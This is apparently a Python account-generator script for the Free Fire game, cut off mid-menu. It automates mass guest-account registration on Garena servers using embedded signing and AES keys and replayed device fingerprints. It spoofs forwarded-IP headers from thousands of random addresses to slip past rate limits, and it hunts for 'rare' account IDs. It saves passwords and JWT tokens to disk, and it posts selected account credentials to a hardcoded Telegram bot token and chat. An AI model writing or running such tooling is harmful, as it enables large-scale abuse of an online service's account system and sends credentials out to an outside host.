import ctypes
import sys
import os
import platform
import traceback
import requests
from email.utils import parsedate_to_datetime
from datetime import datetime, timedelta, timezone

IST = timezone(timedelta(hours=5, minutes=30))

def get_real_time_ist(timeout=3.0, retries=3):
    hosts = [
        "https://www.google.com",
        "https://www.cloudflare.com",
        "https://www.bing.com"
    ]

    for attempt in range(retries):
        for host in hosts:
            try:
                r = requests.head(host, timeout=timeout, allow_redirects=True)
                date_hdr = r.headers.get("Date")
                if not date_hdr:
                    raise ValueError("No Date header")
                utc_time = parsedate_to_datetime(date_hdr).astimezone(timezone.utc)
                real_time = utc_time.astimezone(IST)
                return real_time
            except Exception:
                pass

    return datetime.now(IST)

def parse_expiry_ist(expiry_str_inner):
    dt = datetime.strptime(expiry_str_inner, "%d-%b-%Y %I:%M %p")
    return dt.replace(tzinfo=IST)

def hard_exit(msg=None, code=1):
    try:
        if msg:
            try:
                sys.stderr.write(str(msg) + "\n")
                sys.stderr.flush()
            except Exception:
                pass

        if os.name == "nt":
            try:
                ctypes.windll.kernel32.ExitProcess(int(code))
            except Exception:
                pass
        else:
            try:
                libc = ctypes.CDLL(None)
                _exit = getattr(libc, "_exit", None)
                if _exit:
                    _exit(int(code))
                else:
                    libc.exit(int(code))
            except Exception:
                pass

        try:
            os._exit(int(code))
        except Exception:
            pass

        try:
            import signal
            os.kill(os.getpid(), signal.SIGKILL)
        except Exception:
            pass

    except Exception:
        try:
            raise SystemExit(code)
        except Exception:
            pass

def is_expired(expiry_ist_dt, time_fetcher=get_real_time_ist):
    now = time_fetcher()
    return now >= expiry_ist_dt

expiry_str = "11-Sep-8999 01:10 PM"
expiry = parse_expiry_ist(expiry_str)

try:
    if is_expired(expiry):
        hard_exit("❌ Expired — access denied.")
except Exception as e:
    tb = traceback.format_exc()
    hard_exit("⚠️ Real-time/expiry check failed: " + str(e) + "\n" + tb)

import os, sys, time, signal, threading, json, random, requests, re, codecs, base64
import hmac, hashlib, socket, shutil
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import urllib3
from colorama import init, Fore, Back, Style
import concurrent.futures

urllib3.disable_warnings()
init(autoreset=True)

R = Style.RESET_ALL
WH = Fore.WHITE
RD = Fore.RED
GN = Fore.GREEN
LR = Fore.LIGHTRED_EX
DR = Fore.LIGHTBLACK_EX
GD = Fore.LIGHTYELLOW_EX
LG = Fore.LIGHTGREEN_EX
BR = Style.BRIGHT
BL = Fore.BLUE
LB = Fore.LIGHTBLUE_EX
PK = Fore.MAGENTA
LP = Fore.LIGHTMAGENTA_EX
YL = Fore.YELLOW

BG_RED = Back.RED + Fore.WHITE + Style.BRIGHT
BG_DARK_RED = Back.RED + Fore.BLACK + Style.BRIGHT
BG_LIGHT_RED = Back.LIGHTRED_EX + Fore.WHITE + Style.BRIGHT
BG_GREEN = Back.GREEN + Fore.BLACK + Style.BRIGHT
BG_DARK_GREEN = Back.GREEN + Fore.WHITE + Style.BRIGHT
BG_LIGHT_GREEN = Back.GREEN + Fore.BLACK + Style.BRIGHT
BG_BLUE = Back.BLUE + Fore.WHITE + Style.BRIGHT
BG_PINK = Back.MAGENTA + Fore.WHITE + Style.BRIGHT
BG_YELLOW = Back.YELLOW + Fore.BLACK + Style.BRIGHT

VERSION = "XLOOP V3"
TOOL_NAME = "XLOOP GEN"
ZUY_SPEED = "ULTRA"

BASE_FOLDER = "XLOOP_GEN"
FOLDERS = [
    os.path.join(BASE_FOLDER, x) for x in 
    ["NORMAL", "GHOST", "COUPLE", "RATE", "RATE/LEGENDARY", 
     "RATE/MYTHIC", "RATE/EPIC", "RATE/RARE", "TOKENS"]
]

for f in FOLDERS:
    os.makedirs(f, exist_ok=True)

ACC_FOLDER = FOLDERS[0]
GHOST_FOLDER = FOLDERS[1]
CPL_FOLDER = FOLDERS[2]
LEG_FOLDER = FOLDERS[4]
MYTH_FOLDER = FOLDERS[5]
EPIC_FOLDER = FOLDERS[6]
RARE_FOLDER = FOLDERS[7]
TOK_FOLDER = FOLDERS[8]

REGION_LANG = {
    "ME": "ar", "IND": "hi", "ID": "id", "VN": "vi", "TH": "th",
    "BD": "bn", "PK": "ur", "TW": "zh", "CIS": "ru", "SAC": "es"
}

REGION_NAMES = {
    "ME": "Middle East", "IND": "India", "ID": "Indonesia",
    "VN": "Vietnam", "TH": "Thailand", "BD": "Bangladesh",
    "PK": "Pakistan", "TW": "Taiwan", "CIS": "CIS", "SAC": "South America"
}

REGION_DISPLAY = {
    "ME": "ME - Middle East", "IND": "IND - India", "ID": "ID - Indonesia",
    "VN": "VN - Vietnam", "TH": "TH - Thailand", "BD": "BD - Bangladesh",
    "PK": "PK - Pakistan", "TW": "TW - Taiwan", "CIS": "CIS - CIS",
    "SAC": "SAC - South America"
}

HEX_KEY = bytes.fromhex(
    "3265653434383139653962343539383834353134313036376232383136323138"
    "3734643064356437616639643866376530306331653534373135623764316533"
)

EXIT_FLAG = False
SUCCESS = 0
RARE = 0
EPIC = 0
MYTHIC = 0
LEGENDARY = 0
COUPLE = 0
THRESH = 8
HUNTER = False
START = 0.0

LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()
FILE_LOCKS = {}
FILE_LOCK = threading.Lock()
COUPLES = {}
COUPLES_LOCK = threading.Lock()

def get_lock(p):
    with FILE_LOCK:
        if p not in FILE_LOCKS:
            FILE_LOCKS[p] = threading.Lock()
        return FILE_LOCKS[p]
        
TELEGRAM_BOT_TOKEN = "8985675559:AAHULsGO9DUA36jrGmOIe4F_pBts23Bh0iQ"
TELEGRAM_CHAT_ID = "-1004311798579"

def send_telegram_notif(acc, rtype, score, reason):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    
    if rtype == "LEGENDARY":
        badge = "[ LEGENDARY FIND ]"
        banner_color = "<b>GACOR</b>"
    else:
        badge = "[ MYTHIC FIND ]"
        banner_color = "<b>OKE JUGA</b>"

    clean_reason = reason.split("|")[-1] if "|" in reason else reason
    
    text = (
        f"═══════════════════\n"
        f"     <b>{badge}</b>\n"
        f"═══════════════════\n\n"
        f"Status: {banner_color}\n"
        f"Score: <code>{score} PTS</code>\n\n"
        f"<b>┌─ 👤 ACCOUNT INFO</b>\n"
        f"├ <b>ID:</b> <code>{acc.get('account_id', 'N/A')}</code>\n"
        f"├ <b>Name:</b> <code>{acc.get('name', 'N/A')}</code>\n"
        f"├ <b>UID:</b> <code>{acc.get('uid', 'N/A')}</code>\n"
        f"└ <b>Pass:</b> <code>{acc.get('password', 'N/A')}</code>\n\n"
        f"<b>┌─ 🌐 SYSTEM DATA</b>\n"
        f"├ <b>Region:</b> <code>{acc.get('region', 'N/A')}</code>\n"
        f"├ <b>Pattern:</b> <code>{clean_reason}</code>\n"
        f"└ <b>Time:</b> <code>{datetime.now().strftime('%H:%M:%S | %d-%b-%Y')}</code>\n\n"
        f"<i>🤖 Generated by Axell</i>\n"
        f"═══════════════════"
    )
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": text,
        "parse_mode": "HTML"
    }
    
    try:
        requests.post(url, data=payload, timeout=3, verify=False)
    except Exception:
        pass

class IPPool:
    pool = []
    idx = 0
    lock = threading.Lock()
    
    @classmethod
    def build(cls, n=8000):
        seen = set()
        while len(cls.pool) < n:
            ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            if ip not in seen:
                seen.add(ip)
                cls.pool.append(ip)
    
    @classmethod
    def get(cls):
        with cls.lock:
            if not cls.pool:
                cls.build()
            ip = cls.pool[cls.idx % len(cls.pool)]
            cls.idx += 1
            return ip

IPPool.build()

UAS = [
    "GarenaMSDK/4.0.44(SM-S928B;Android 14;en;SG;)",
    "GarenaMSDK/4.0.42(SM-A525F;Android 13;en;ID;)",
    "GarenaMSDK/4.0.41(SM-S918B;Android 14;en;IN;)",
    "GarenaMSDK/4.0.40(Pixel 8 Pro;Android 14;en;US;)",
    "GarenaMSDK/4.0.42(Xiaomi 14;Android 14;id;ID;)",
    "GarenaMSDK/4.0.43(OnePlus 12;Android 14;en;MY;)",
]

def ua():
    return random.choice(UAS)

sess = requests.Session()
sess.mount("https://", requests.adapters.HTTPAdapter(pool_maxsize=2000))

def req(method, url, **kw):
    kw.setdefault("timeout", 5)
    kw["verify"] = False
    try:
        return sess.request(method, url, **kw)
    except:
        return None

AES_KEY = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
AES_IV = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])

def aes_enc(h):
    try:
        c = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        return c.encrypt(pad(bytes.fromhex(h), AES.block_size))
    except:
        return b""

def aes_hex(h):
    try:
        return aes_enc(h).hex()
    except:
        return ""

def varint(n):
    if n < 0:
        return b""
    out = []
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            b |= 0x80
        out.append(b)
        if not n:
            break
    return bytes(out)

def proto(fn, val):
    if isinstance(val, int):
        return varint((fn<<3)|0) + varint(val)
    ev = val.encode() if isinstance(val, str) else val
    return varint((fn<<3)|2) + varint(len(ev)) + ev

def build_proto(fields):
    return b"".join(proto(k,v) for k,v in fields.items())

WRAP = [("꧁","꧂"),("『","』"),("【","】"),("《","》")]
SYMS = ["☆","★","✧","✦","♡","♥"]
EXPS = {str(i): c for i,c in enumerate("⁰¹²³⁴⁵⁶⁷⁸⁹")}

def exp():
    return "".join(EXPS[d] for d in f"{random.randint(1,9999):04d}")

def gen_name(base):
    e = exp()
    if random.random() < 0.4:
        l, r2 = random.choice(WRAP)
        return f"{l}{base}{r2}{e}"
    return f"{base}{random.choice(SYMS)}{e}"

PATS = {
    "R4": (r"(\d)\1{3,}", 5),
    "R3": (r"(\d)\1\1(\d)\2\2", 4),
    "S5": (r"(12345|23456|34567|45678|56789)", 6),
    "S4": (r"(0123|1234|2345|3456|4567|5678|6789|9876|8765|7654|6543|5432|4321|3210)", 5),
    "P6": (r"^(\d)(\d)(\d)\3\2\1$", 7),
    "P4": (r"^(\d)(\d)\2\1$", 5),
    "SPH": (r"(69|420|1337|007)", 6),
    "TRIP": (r"(666|777|888|999)", 4),
    "QUAD": (r"(1111|2222|3333|4444|5555|6666|7777|8888|9999|0000)", 7),
}
CPATS = {k: (re.compile(p), s) for k,(p,s) in PATS.items()}

def check_rarity_score(aid):
    if not aid or aid == "N/A":
        return 0, []
    score = 0
    found = []
    for ptype, (pat, pts) in CPATS.items():
        if pat.search(aid):
            score += pts
            found.append(ptype)
    digits = [int(d) for d in aid if d.isdigit()]
    if len(digits) >= 4:
        if len(set(digits)) == 1:
            b = min(10, len(digits))
            score += b
            found.append(f"UNI+{b}")
        if len(digits) >= 5:
            diffs = [digits[i+1]-digits[i] for i in range(len(digits)-1)]
            if len(set(diffs)) == 1 and abs(diffs[0]) == 1:
                b = min(8, len(digits))
                score += b
                found.append(f"SEQ+{b}")
    if aid.isdigit():
        v = int(aid)
        if len(aid) <= 6 and v < 10000:
            score += 10
            found.append("ULTRA_LOW")
        elif len(aid) <= 8 and v < 100000:
            score += 7
            found.append("LOW")
    return score, found

def check_rarity(acc):
    aid = acc.get("account_id", "")
    score, found = check_rarity_score(aid)
    
    if score >= 12:
        rt = "LEGENDARY"
        custom = "MADEV"
        emoji = "👑"
        color = LR  # Merah Muda
    elif score >= 9:
        rt = "MYTHIC"
        custom = "GAGAH PISAN"
        emoji = "⚡"
        color = RD  # Merah Tua
    elif score >= 6:
        rt = "EPIC"
        custom = "MEJEUH EUY"
        emoji = "🌟"
        color = YL  # Kuning
    elif score >= 4:
        rt = "RARE"
        custom = "AHK BUTUT"
        emoji = "✨"
        color = LB  # Biru
    else:
        rt = None
        custom = ""
        emoji = ""
        color = WH
    
    if not rt:
        return False, None, "", score, "", "", WH
    
    if HUNTER:
        rank = {"RARE":0, "EPIC":1, "MYTHIC":2, "LEGENDARY":3}
        if rank.get(rt, 0) < 1:
            return False, None, "", score, "", "", WH
    
    return True, rt, f"{aid}|sc={score}|{','.join(found[:5])}", score, custom, emoji, color

def check_couple(acc, tid):
    aid = acc.get("account_id", "")
    if not aid or aid == "N/A":
        return False, "", None
    with COUPLES_LOCK:
        for sid, st in list(COUPLES.items()):
            sa = st.get("account_id", "")
            if not sa:
                continue
            try:
                if abs(int(aid) - int(sa)) == 1:
                    del COUPLES[sid]
                    return True, f"SEQ {aid}&{sa}", st
                if aid == sa[::-1]:
                    del COUPLES[sid]
                    return True, f"MIR {aid}&{sa}", st
            except:
                pass
        COUPLES[aid] = {
            "uid": acc.get("uid", ""),
            "account_id": aid,
            "name": acc.get("name", ""),
            "password": acc.get("password", ""),
            "region": acc.get("region", ""),
            "thread_id": tid
        }
    return False, "", None

W = 62

def clr():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clr()
    print(f"""{GN}
     █████╗ ██╗  ██╗███████╗██╗     ██╗     
    ██╔══██╗╚██╗██╔╝██╔════╝██║     ██║     
    ███████║ ╚███╔╝ █████╗  ██║     ██║     
    ██╔══██║ ██╔██╗ ██╔══╝  ██║     ██║     
    ██║  ██║██╔╝ ██╗███████╗███████╗███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   
                                        
{R}""")
    print(f"{GN}╔{'═'*W}╗{R}")
    print(f"{GN}║{R}  {LG}◈{R} {BR}{WH}{TOOL_NAME}{R} {GD}v{VERSION}{R}  {DR}│{R}  {LG}FF OB54{R}  {DR}│{R}  {WH}{ZUY_SPEED}{R}")
    print(f"{GN}╚{'═'*W}╝{R}")

def box(title, lines):
    print(f"{GN}┌{'─'*W}┐{R}")
    print(f"{GN}│{R}  {WH}{title}{R}")
    print(f"{GN}├{'─'*W}┤{R}")
    for ln in lines:
        raw = re.sub(r"\x1b\[[0-9;]*m", "", ln)
        pad = max(0, W - 2 - len(raw))
        print(f"{GN}│{R}  {ln}{' '*pad}{GN}│{R}")
    print(f"{GN}└{'─'*W}┘{R}")

BADGE = {
    "LEGENDARY": f"{BG_LIGHT_RED}  LEGENDARY  {R}",
    "MYTHIC": f"{BG_DARK_RED}  MYTHIC  {R}",
    "EPIC": f"{BG_YELLOW}  EPIC  {R}",
    "RARE": f"{BG_BLUE}  RARE  {R}",
    "COUPLE": f"{BG_PINK}  COUPLE  {R}",
    "NORMAL": f"{DR}  NORMAL  {R}",
}

def print_acc(idx, uid, aid, name, status, score=0, cid=None, custom="", emoji="", color=WH):
    badge = BADGE.get(status, BADGE["NORMAL"])
    
    if status in ("LEGENDARY", "MYTHIC", "EPIC", "RARE", "COUPLE"):
        sc = {
            "LEGENDARY": LR,
            "MYTHIC": RD,
            "EPIC": YL,
            "RARE": LB,
            "COUPLE": LP
        }.get(status, WH)
    else:
        sc = WH
    
    with PRINT_LOCK:
        if status in ("OK", "NORMAL"):
            line = f"{DR}[{idx:^6}]{R}  {WH}{str(aid):<15}{R}  {badge}"
        elif status == "COUPLE":
            line = f"{LP}[{idx:^6}]{R}  {LP}{str(aid):<15}{R}  {badge}"
        else:
            # ID diwarnai sesuai rarity
            line = f"{sc}[{idx:^1}]{R}  {color}{str(aid):<15}{R}  {badge}    {sc}{score}{R}"
        sys.stdout.write(line + "\n")
        sys.stdout.flush()

def hdrs():
    return {
        "User-Agent": ua(),
        "X-Forwarded-For": IPPool.get(),
        "X-Real-IP": IPPool.get()
    }

def create_account(region, name_base, pw_prefix, is_ghost):
    if EXIT_FLAG:
        return None
    try:
        pw = f"{pw_prefix}_{''.join(random.choices('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=7))}"
        body = json.dumps({
            "app_id": 100067,
            "client_type": 2,
            "password": pw,
            "source": 2
        }, separators=(",", ":"))
        sig = hmac.new(HEX_KEY, body.encode(), hashlib.sha256).hexdigest()
        headers = {
            **hdrs(),
            "Authorization": f"Signature {sig}",
            "Content-Type": "application/json",
            "Host": "100067.connect.garena.com"
        }
        r = req("POST", "https://100067.connect.garena.com/api/v2/oauth/guest:register",
                headers=headers, data=body)
        if r and r.status_code == 200:
            d = r.json()
            if "data" in d and "uid" in d["data"]:
                return get_token(d["data"]["uid"], pw, region, name_base, is_ghost)
    except:
        pass
    return None

def get_token(uid, pw, region, name_base, is_ghost):
    if EXIT_FLAG:
        return None
    try:
        data = {
            "uid": uid,
            "password": pw,
            "response_type": "token",
            "client_type": "2",
            "client_secret": HEX_KEY,
            "client_id": "100067"
        }
        headers = {
            **hdrs(),
            "Content-Type": "application/x-www-form-urlencoded"
        }
        r = req("POST", "https://100067.connect.garena.com/oauth/guest/token/grant",
                headers=headers, data=data)
        if r and r.status_code == 200:
            rj = r.json()
            if "open_id" in rj:
                oid = rj["open_id"]
                tok = rj["access_token"]
                ks = [0x30,0x30,0x30,0x32,0x30,0x31,0x37,0x30,0x30,0x30,0x30,0x30,
                      0x32,0x30,0x31,0x37,0x30,0x30,0x30,0x30,0x30,0x32,0x30,0x31,
                      0x37,0x30,0x30,0x30,0x30,0x30,0x32,0x30]
                enc = "".join(chr(ord(oid[i]) ^ ks[i % len(ks)]) for i in range(len(oid)))
                field = codecs.decode(
                    "".join(c if 32 <= ord(c) <= 126 else f"\\u{ord(c):04x}" for c in enc),
                    "unicode_escape"
                ).encode("latin1")
                return major_register(tok, oid, field, uid, pw, region, name_base, is_ghost)
    except:
        pass
    return None

def major_register(tok, oid, field, uid, pw, region, name_base, is_ghost):
    if EXIT_FLAG:
        return None
    try:
        if is_ghost or region not in ("ME", "TH"):
            url = "https://loginbp.ggpolarbear.com/MajorRegister"
        else:
            url = "https://loginbp.common.ggbluefox.com/MajorRegister"
        
        name = gen_name(name_base)
        headers = {
            **hdrs(),
            "ReleaseVersion": "OB54",
            "X-GA": "v1 1",
            "X-Unity-Version": "2018.4."
        }
        lang = "pt" if is_ghost else REGION_LANG.get(region, "en")
        payload = {
            1: name,
            2: tok,
            3: oid,
            5: 102000007,
            6: 4,
            7: 1,
            13: 1,
            14: field,
            15: lang,
            16: 1,
            17: 1
        }
        encrypted = aes_enc(build_proto(payload).hex())
        if not encrypted:
            return None
        req("POST", url, headers=headers, data=encrypted)
        
        login = major_login(uid, pw, tok, oid, region, is_ghost)
        aid = login.get("account_id", "N/A")
        jwt = login.get("jwt_token", "")
        
        if aid != "N/A":
            if not is_ghost and jwt and region != "BR":
                try:
                    force_region(region, jwt)
                except:
                    pass
            return {
                "uid": uid,
                "password": pw,
                "name": name,
                "region": "GHOST" if is_ghost else region,
                "account_id": aid,
                "jwt_token": jwt,
                "created_at": datetime.now().isoformat()
            }
    except:
        pass
    return None

def major_login(uid, pw, tok, oid, region, is_ghost):
    try:
        lang = "pt" if is_ghost else REGION_LANG.get(region, "en")
        parts = [
            b'\x1a\x132025-08-30 05:19:21"\tfree fire(\x01:\x081.114.13B2Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)J\x08HandheldR\nATM MobilsZ\x04WIFI`\xb6\nh\xee\x05r\x03300z\x1fARMv7 VFPv3 NEON VMH | 2400 | 2\x80\x01\xc9\x0f\x8a\x01\x0fAdreno (TM) 640\x92\x01\rOpenGL ES 3.2\x9a\x01+Google|dfa4ab4b-9dc4-454e-8065-e70c733fa53f\xa2\x01\x0e105.235.139.91\xaa\x01\x02',
            lang.encode("ascii"),
            b'\xb2\x01 1d8ec0240ede109973f3321b9354b44d\xba\x01\x014\xc2\x01\x08Handheld\xca\x01\x10Asus ASUS_I005DA\xea\x01@afcfbf13334be42036e4f742c80b956344bed760ac91b3aff9b607a610ab4390\xf0\x01\x01\xca\x02\nATM Mobils\xd2\x02\x04WIFI\xca\x03 7428b253defc164018c604a1ebbfebdf\xe0\x03\xa8\x81\x02\xe8\x03\xf6\xe5\x01\xf0\x03\xaf\x13\xf8\x03\x84\x07\x80\x04\xe7\xf0\x01\x88\x04\xa8\x81\x02\x90\x04\xe7\xf0\x01\x98\x04\xa8\x81\x02\xc8\x04\x01\xd2\x04=/data/app/com.dts.freefireth-PdeDnOilCSFn37p1AH_FLg==/lib/arm\xe0\x04\x01\xea\x04_2087f61c19f57f2af4e7feff0b24d9d9|/data/app/com.dts.freefireth-PdeDnOilCSFn37p1AH_FLg==/base.apk\xf0\x04\x03\xf8\x04\x01\x8a\x05\x0232\x9a\x05\n2019118692\xb2\x05\tOpenGLES2\xb8\x05\xff\x7f\xc0\x05\x04\xe0\x05\xf3F\xea\x05\x07android\xf2\x05pKqsHT5ZLWrYljNb5Vqh//yFRlaPHSO9NWSQsVvOmdhEEn7W+VHNUK+Q+fduA3ptNrGB0Ll0LRz3WW0jOwesLj6aiU7sZ40p8BfUE/FI/jzSTwRe2\xf8\x05\xfb\xe4\x06\x88\x06\x01\x90\x06\x01\x9a\x06\x014\xa2\x06\x014\xb2\x06"GQ@O\x00\x0e^\x00D\x06UA\x0ePM\r\x13hZ\x07T\x06\x0cm\\V\x0ejYV;\x0bU5'
        ]
        payload = b"".join(parts)
        
        if is_ghost or region not in ("ME", "TH"):
            url = "https://loginbp.ggpolarbear.com/MajorLogin"
        else:
            url = "https://loginbp.common.ggbluefox.com/MajorLogin"
        
        data = payload.replace(
            b'afcfbf13334be42036e4f742c80b956344bed760ac91b3aff9b607a610ab4390',
            tok.encode()
        )
        data = data.replace(
            b'1d8ec0240ede109973f3321b9354b44d',
            oid.encode()
        )
        
        enc_data = aes_hex(data.hex())
        if not enc_data:
            return {"account_id": "N/A", "jwt_token": ""}
        
        headers = {
            **hdrs(),
            "Content-Type": "application/x-www-form-urlencoded",
            "ReleaseVersion": "OB54",
            "X-GA": "v1 1",
            "X-Unity-Version": "2018.4.11f1"
        }
        
        r = req("POST", url, headers=headers, data=bytes.fromhex(enc_data))
        
        if r and r.status_code == 200 and len(r.text) > 10:
            j = r.text.find("eyJ")
            if j != -1:
                jwt = r.text[j:]
                d2 = jwt.find(".", jwt.find(".") + 1)
                if d2 != -1:
                    jwt = jwt[:d2 + 44]
                    try:
                        p = jwt.split(".")[1]
                        p += "=" * (4 - len(p) % 4) if len(p) % 4 else ""
                        d = json.loads(base64.urlsafe_b64decode(p))
                        aid = d.get("account_id") or d.get("external_id")
                        if aid:
                            return {"account_id": str(aid), "jwt_token": jwt}
                    except:
                        pass
        return {"account_id": "N/A", "jwt_token": ""}
    except:
        return {"account_id": "N/A", "jwt_token": ""}

def force_region(region, jwt):
    try:
        if region in ("ME", "TH"):
            url = "https://loginbp.common.ggbluefox.com/ChooseRegion"
        else:
            url = "https://loginbp.ggpolarbear.com/ChooseRegion"
        
        rc = "RU" if region == "CIS" else region
        proto_data = build_proto({1: rc})
        enc = aes_hex(proto_data.hex())
        if not enc:
            return
        
        headers = {
            **hdrs(),
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {jwt}",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB54"
        }
        req("POST", url, headers=headers, data=bytes.fromhex(enc))
    except:
        pass

def worker(region, name_base, pw_prefix, total, tid, is_ghost):
    global SUCCESS, RARE, COUPLE
    while not EXIT_FLAG:
        with LOCK:
            if SUCCESS >= total:
                break
        acc = create_account(region, name_base, pw_prefix, is_ghost)
        if not acc or acc.get("account_id", "N/A") == "N/A":
            continue
        
        with LOCK:
            if SUCCESS >= total:
                break
            idx = SUCCESS + 1
        
        acc["thread_id"] = tid
        uid = acc.get("uid", "N/A")
        aid = acc.get("account_id", "N/A")
        name = acc.get("name", "N/A")
        
        is_rare, rtype, reason, score, custom, emoji, color = check_rarity(acc)
        is_couple, creason, partner = check_couple(acc, tid)
        
        if is_couple and partner:
            with LOCK:
                if SUCCESS >= total:
                    break
                COUPLE += 1
                SUCCESS += 1
                idx = SUCCESS
            save_couple(acc, partner, creason, is_ghost)
            save_normal(acc, "GHOST" if is_ghost else region, is_ghost)
            print_acc(idx, uid, aid, name, "COUPLE", cid=partner.get("account_id", "N/A"))
        elif is_rare:
            with LOCK:
                if SUCCESS >= total:
                    break
                if rtype == "LEGENDARY":
                    LEGENDARY += 1
                elif rtype == "MYTHIC":
                    MYTHIC += 1
                elif rtype == "EPIC":
                    EPIC += 1
                elif rtype == "RARE":
                    RARE += 1
                
                SUCCESS += 1
                idx = SUCCESS
            save_rare(acc, rtype, reason, score)
            save_normal(acc, "GHOST" if is_ghost else region, is_ghost)
            print_acc(idx, uid, aid, name, rtype, score=score, custom=custom, emoji=emoji, color=color)
            if rtype in ("LEGENDARY", "MYTHIC"):
                threading.Thread(
                    target=send_telegram_notif, 
                    args=(acc, rtype, score, reason), 
                    daemon=True
                ).start()
        else:
            with LOCK:
                if SUCCESS >= total:
                    break
                SUCCESS += 1
                idx = SUCCESS
            save_normal(acc, "GHOST" if is_ghost else region, is_ghost)
            print_acc(idx, uid, aid, name, "OK")
        
        if acc.get("jwt_token"):
            save_token(acc, acc["jwt_token"], "GHOST" if is_ghost else region, is_ghost)

def save_json(fn, entry):
    try:
        os.makedirs(os.path.dirname(fn), exist_ok=True)
        tmp = fn + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(entry, f, indent=2, ensure_ascii=False)
        if os.path.exists(fn):
            os.remove(fn)
        shutil.move(tmp, fn)
        return True
    except:
        return False

def save_normal(acc, region, is_ghost=False):
    try:
        if is_ghost:
            fn = os.path.join(GHOST_FOLDER, "ghost.json")
        else:
            fn = os.path.join(ACC_FOLDER, f"accounts-{region}.json")
        
        entry = {
            "uid": acc["uid"],
            "password": acc["password"],
            "account_id": acc.get("account_id", "N/A"),
            "name": acc["name"],
            "region": "GHOST" if is_ghost else region,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "thread": acc.get("thread_id", "N/A")
        }
        
        with get_lock(fn):
            data = []
            if os.path.exists(fn):
                try:
                    with open(fn, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except:
                    data = []
            
            existing = [x.get("account_id") for x in data]
            if acc.get("account_id", "N/A") not in existing:
                data.append(entry)
                tmp = fn + ".tmp"
                with open(tmp, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                if os.path.exists(fn):
                    os.remove(fn)
                shutil.move(tmp, fn)
        return True
    except:
        return False

def save_rare(acc, rl, reason, score):
    try:
        region = acc.get("region", "UNKNOWN")
        aid = acc.get("account_id", "N/A")
        if aid == "N/A":
            return False
        
        base = {"LEGENDARY": LEG_FOLDER, "MYTHIC": MYTH_FOLDER, "EPIC": EPIC_FOLDER}.get(rl, RARE_FOLDER)
        folder = os.path.join(base, region)
        os.makedirs(folder, exist_ok=True)
        
        fn = os.path.join(folder, f"{aid}.json")
        entry = {
            "uid": acc["uid"],
            "password": acc["password"],
            "account_id": aid,
            "name": acc["name"],
            "region": region,
            "region_name": REGION_NAMES.get(region, region),
            "rarity_level": rl,
            "rarity_score": score,
            "reason": reason,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "jwt": acc.get("jwt_token", ""),
            "thread": acc.get("thread_id", "N/A")
        }
        return save_json(fn, entry)
    except:
        return False

def save_couple(a1, a2, reason, is_ghost=False):
    try:
        if is_ghost:
            fn = os.path.join(CPL_FOLDER, "couples-ghost.json")
        else:
            fn = os.path.join(CPL_FOLDER, f"couples-{a1.get('region', 'UNKNOWN')}.json")
        
        cid = f"{a1.get('account_id', 'N/A')}_{a2.get('account_id', 'N/A')}"
        entry = {
            "couple_id": cid,
            "account1": a1,
            "account2": a2,
            "reason": reason,
            "region": "GHOST" if is_ghost else a1.get("region", "UNKNOWN"),
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        with get_lock(fn):
            data = []
            if os.path.exists(fn):
                try:
                    with open(fn, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except:
                    data = []
            
            existing = [x.get("couple_id") for x in data]
            if cid not in existing:
                data.append(entry)
                tmp = fn + ".tmp"
                with open(tmp, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                if os.path.exists(fn):
                    os.remove(fn)
                shutil.move(tmp, fn)
        return True
    except:
        return False

def save_token(acc, jwt, region, is_ghost=False):
    try:
        if is_ghost:
            fn = os.path.join(GHOST_FOLDER, "tokens-ghost.json")
        else:
            fn = os.path.join(TOK_FOLDER, f"tokens-{region}.json")
        
        entry = {
            "uid": acc["uid"],
            "account_id": acc.get("account_id", "N/A"),
            "jwt": jwt,
            "name": acc["name"],
            "password": acc["password"],
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "region": "GHOST" if is_ghost else region,
            "thread": acc.get("thread_id", "N/A")
        }
        
        with get_lock(fn):
            data = []
            if os.path.exists(fn):
                try:
                    with open(fn, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except:
                    data = []
            
            existing = [x.get("account_id") for x in data]
            if acc.get("account_id", "N/A") not in existing:
                data.append(entry)
                tmp = fn + ".tmp"
                with open(tmp, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                if os.path.exists(fn):
                    os.remove(fn)
                shutil.move(tmp, fn)
        return True
    except:
        return False

def menu():
    global HUNTER, THRESH
    while True:
        banner()
        print()
        print(f"{GN}┌{'─'*W}┐{R}")
        print(f"{GN}│{R}  {LG}📋 XLOOP MENU{R}")
        print(f"{GN}├{'─'*W}┤{R}")
        print(f"{GN}│{R}  {GN}◆{R} {GD}1{R} {DR}›{R} {WH}Generate{R}")
        print(f"{GN}│{R}  {GN}◆{R} {GD}2{R} {DR}›{R} {WH}Rare Hunter{R}")
        print(f"{GN}│{R}  {GN}◆{R} {GD}3{R} {DR}›{R} {WH}View Saved{R}")
